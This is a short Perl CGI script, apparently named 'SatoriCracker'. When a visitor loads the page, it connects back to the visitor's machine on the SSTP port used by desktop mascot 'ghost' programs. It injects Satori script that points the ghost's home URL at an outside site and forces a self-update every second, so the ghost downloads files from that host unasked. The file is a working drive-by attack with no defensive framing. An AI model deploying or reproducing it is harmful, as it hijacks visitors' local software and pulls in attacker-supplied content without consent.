#!/usr/bin/perl
use utf8;

sub sendsstp {
use Socket;

$script=$_[0];
$ref0=$_[1];
$sender='SatoriCracker';

$port=9801;
$addr=$ENV{'HTTP_X_FORWARDED_FOR'};
if (index($addr,'.')==-1) { $addr = $ENV{'REMOTE_ADDR'}; }

$proto = getprotobyname('tcp');
socket(S, PF_INET, SOCK_STREAM, $proto);
$ent = sockaddr_in($port, inet_aton($addr));
connect(S, $ent) || die;
select(S); $| = 1; select(STDOUT);

print S "SEND SSTP/1.1\r\n";
print S "Charset: UTF-8\r\n";
print S "Sender: $sender\r\n";
print S "Event: ShioriEcho\r\n";
print S "Reference0: $ref0\r\n";
print S "IfGhost: "+'ポスト'+"\r\n";
print S "Script: $script\r\n";
print S "\r\n";

$result = <S>;
while (<S>) { print; }
close(S);

return($result);

}

$s=sendsstp('\e','（単語の追加、homeurl、http://nikola.ps.land.to/sstp/ghost/satoricracker/）（単語の追加、OnSecondChange、\![updatebymyself]\e）\e');
